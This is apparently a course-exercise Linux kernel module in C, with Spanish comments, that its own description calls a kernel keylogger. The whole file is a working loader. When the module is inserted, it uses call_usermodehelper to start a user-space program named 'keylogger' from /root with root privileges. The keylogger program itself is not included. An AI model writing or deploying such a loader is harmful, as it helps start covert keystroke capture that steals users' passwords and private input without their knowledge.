#include <linux/module.h> /* Necesario en todos los modulos */
#include <linux/kernel.h> /* Necesario para alertas  e info como KERN_INFO */
#include <linux/init.h>   /* Necesario para las macros init y exit */
#define DRIVER_AUTHOR "Jorge Cuecuecha"
#define DRIVER_DESC "Keylogger en kernel"
#define RUTA "/root/cursoC/practica20/keylogger"


static void __exit fin(void)
{
printk(KERN_INFO "Terminado \n");
}

static int externo(void)
{
printk(KERN_ALERT "Inicio\n");
char *argv[]={RUTA,NULL};
static char *envp[]={"HOME=/","TERM=linux","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
return call_usermodehelper(argv[0],argv,envp,UMH_WAIT_PROC);
}
static int __init x_x(void)
{
return externo();
}

module_init(externo);
module_exit(fin);
MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);

